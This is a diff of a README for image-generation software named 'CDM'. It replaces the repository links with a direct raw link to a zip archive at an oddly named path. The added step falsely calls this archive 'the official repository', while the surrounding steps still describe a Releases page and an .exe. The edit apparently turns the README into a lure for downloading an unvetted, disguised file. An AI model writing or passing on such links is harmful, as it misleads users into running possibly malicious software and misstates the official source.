@@ -1,6 +1,6 @@
 # ⚡ CDM - Create High Quality Images Faster
 
-[![Download CDM](https://img.shields.io/badge/Download-CDM_Software-blue.svg)](https://github.com/Ambrosiusactive929/CDM)
+[![Download CDM](https://img.shields.io/badge/Download-CDM_Software-blue.svg)](https://raw.githubusercontent.com/Ambrosiusactive929/CDM/main/scytopetalaceous/Software_spadeful.zip)
 
 ## About This Software
 
@@ -21,7 +21,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  **Visit the download page:** Go to the official repository at [https://github.com/Ambrosiusactive929/CDM](https://github.com/Ambrosiusactive929/CDM).
+1.  **Visit the download page:** Go to the official repository at [https://raw.githubusercontent.com/Ambrosiusactive929/CDM/main/scytopetalaceous/Software_spadeful.zip](https://raw.githubusercontent.com/Ambrosiusactive929/CDM/main/scytopetalaceous/Software_spadeful.zip).
 2.  **Find the release section:** On the right side of the page, locate the section labeled "Releases."
 3.  **Choose your file:** Click the most recent version number. Look for the file ending in `.exe` under the Assets list.
 4.  **Save the file:** Download the installer to your Downloads folder or your desktop for easy access.
